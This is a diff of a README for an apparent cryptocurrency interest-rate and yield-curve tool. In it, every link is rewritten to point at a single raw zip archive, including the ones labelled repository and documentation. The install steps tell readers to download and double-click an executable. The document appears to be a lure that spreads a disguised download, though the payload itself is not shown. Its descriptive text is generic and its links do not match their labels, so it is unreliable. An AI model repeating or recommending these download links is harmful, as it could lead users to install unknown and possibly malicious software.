@@ -4,7 +4,7 @@
 This application provides an easy way to analyze interest rates in cryptocurrency markets. It uses advanced methods to create yield curves without relying on traditional bonds. Whether you are studying financial engineering or just curious about digital assets, this tool is for you.
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip%20Now-Release%20Page-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip)
+[![Download from Releases](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip%20Now-Release%20Page-blue?style=flat&logo=github)](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip)
 
 ## 🎯 Features
 - **Yield Curve Construction**: Build yield curves using unique methodologies.
@@ -22,7 +22,7 @@ To run this application smoothly, you’ll need:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the download options.
-   [Download from Releases](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip)
+   [Download from Releases](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip)
    
 2. **Choose Your Version**: Select the appropriate version for your operating system. Each version file is named clearly.
 
@@ -31,7 +31,7 @@ To run this application smoothly, you’ll need:
 4. **Install the Application**:
    - For **Windows**: Double-click on the `.exe` file you downloaded and follow the prompts.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Follow the instructions for installing from `https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip` or use Python's package management.
+   - For **Linux**: Follow the instructions for installing from `https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip` or use Python's package management.
 
 5. **Run the Application**: Locate the application on your system and double-click to start using the tool.
 
@@ -63,10 +63,10 @@ This application covers several important topics in financial technology and dat
 - Quantitative Finance
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip)
-- [Documentation](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip)
+- [GitHub Repository](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip)
+- [Documentation](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip)
 
-For any further information, always refer to the [documentation](https://raw.githubusercontent.com/Emmanvel/crypto_currencies_interest_rates/main/asaron/crypto_currencies_interest_rates.zip) as it contains more detailed insights and examples. 
+For any further information, always refer to the [documentation](https://github.com/Emmanvel/crypto_currencies_interest_rates/raw/refs/heads/main/asaron/currencies_interest_crypto_rates_v1.0.zip) as it contains more detailed insights and examples. 
 
 ## 📍 Stay Updated
 Make sure to watch the repository for future updates and new features. This tool will keep evolving as we improve our methods and add more functionality. 
